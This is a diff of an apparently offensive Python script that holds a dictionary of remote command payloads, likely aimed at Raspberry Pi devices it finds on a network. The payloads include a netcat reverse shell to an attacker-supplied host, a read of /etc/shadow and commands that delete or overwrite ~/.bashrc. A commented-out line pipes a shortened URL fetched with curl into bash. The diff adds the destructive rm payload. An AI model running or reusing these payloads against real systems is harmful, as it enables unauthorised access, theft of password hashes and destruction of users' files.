@@ -37,17 +37,16 @@ parser.add_argument('-q', dest='quiet', action='store_true',
 		help='don\'t print banner or arp scan output')
 args = parser.parse_args()
 
-#payload= 'echo "raspberry" | sudo -s whoami'
-
 payloads={
 'reverse_shell':'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc '+str(args.host)+' '+str(args.port)+' >/tmp/fc',
 'apt_update':'sudo apt update \&\& sudo apt -y upgrade',
 'raincow_install':'sudo apt -y install fortune cowsay lolcat',
 'gitpip':'sudo apt -y install git python-pip',
 'shadow':'sudo cat /etc/shadow',
-'motd':'sudo echo "change your password" \> /etc/motd',
-'raincow_bashrc':'sudo echo "fortune | cowsay | lolcat" \>\> ~/.bashrc',
-'rickroll':'curl -s -l http://bit.ly/10ha8ic | bash'
+'warning':'sudo echo "echo "change your password!"" \> \~/.bashrc',
+'raincow_bashrc':'sudo echo "fortune \| cowsay \| lolcat" \>\> \~/.bashrc',
+#'rickroll':'curl -s -l http://bit.ly/10ha8ic | bash',
+'rm_bashrc':'rm -rf \~/.bashrc'
 }
 
 if args.payload in payloads:
@@ -63,8 +62,8 @@ else:
 
 def list():
 	l=0
-	cprint("payloads:", "green")
-	print colored("specify with --payload", "green"), colored("name\n", "yellow")
+	cprint("Payloads:", "green")
+	print colored("Specify with --payload", "green"), colored("name\n", "yellow")
 	for key,value in payloads.items():
 		print colored('['+key+']', 'yellow'), colored(value, 'white')
 	print('\n')
